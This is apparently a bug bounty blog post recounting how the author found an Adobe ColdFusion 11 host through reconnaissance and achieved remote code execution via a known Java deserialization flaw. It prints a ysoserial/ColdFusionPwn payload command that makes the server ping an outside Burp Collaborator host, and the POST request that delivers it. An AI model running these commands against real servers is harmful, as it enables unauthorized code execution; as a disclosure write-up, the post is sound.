---
title: 'Basic recon to RCE'
date: 2021-05-02
description: 'How I discovered my first RCE through basic reconnaissance and exploiting a known Java deserialization vulnerability in Adobe ColdFusion.'
tags: ['bugbounty', 'rce', 'java']
image: '/images/blog/2021/basic-recon-to-rce.png'
---

Recently on a BugBounty program I came across my first RCE, discovered and exploited rather quickly on a solution with a vulnerability that I don't master at all : Java Deserialization

## Recon
Currently improving my recognition tool [AutoRecon](https://github.com/JoshuaMart/AutoRecon), originally intended to help me with subdomain enumeration, I also want to perform some recognition tasks that are quite annoying when you have to do it many times.

The scope in question is like `*.domain.tld`, after enumerating subdomains, I wanted to test new tools, in this case [Gau](https://github.com/lc/gau) which allows to retrieve URLs known through several sources. That's when I was asked to see a URL with the extension `.cfm`, which I don't know at all:

![RCE_GAU](./RCE_GAU.png)

A quick search will find that this extension corresponds to `ColdFusion Markup Language`

An access on the URL actually allowed me to confirm that it is indeed the Adobe ColdFusion 11 application that is used, but the design seemed quite old ... interesting.

## Search for known vulnerabilities
A quick search on ExploitDB allowed me to find an exploit:

![RCE_ExploitDB](./RCE_ExploitDB.png)

Unfortunately this one wasn't very detailed, after several researches I found an article that details the vulnerability and its exploitation [Exploiting Adobe Coldfusion](https://codewhitesec.blogspot.com/2018/03/exploiting-adobe-coldfusion.html).

To make a long story short, the exploit is possible through a Java deserialization on the `flex2gateway/amf` endpoint, after verification, it was available and a GET request returned a simple blank page.

## Exploitation
According to the article, exploitation therefore requires only two things:
- [Ysoserial](https://github.com/frohoff/ysoserial) for Java deserialization
- [ColdFusionPWn](https://github.com/frohoff/ysoserial) for exploitation

Then we can finally create our payload, in the following example, if the poc is successful, I will receive a ping on my burp collaborator, the output of the order is recorded in the file `poc.ser` :
`java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'ping {your_collaborator}.burpcollaborator.net' poc.ser`

So all that's left to do is to send it as a POST on the endpoint `flex2gateway/amf` :

`http post https://xyz.domain.tld/flex2gateway/amf Content-Type:application/x-amf < poc.ser`

And then I got the ping on my burp collaborator:

![RCE_PoC](./RCE_PoC.png)

## Conclusion

This is my first RCE found on a private program, really interesting because it exploits a known vulnerability with known exploits, but rather than launching the first exploit I could get my hands on, I preferred to document myself and look for something that would give me the impression to have a better mastery of the exploit even if it was wasting my time.

In fact, I discovered the vulnerability late one night, before exploiting it only the next day because I didn't want to do anything harmful since it's production.

Nevertheless, [Gau](https://github.com/lc/gau) is really a must-have and if you don't count the time spent reading / understanding the vulnerability, the research and exploitation took me less than 30min.
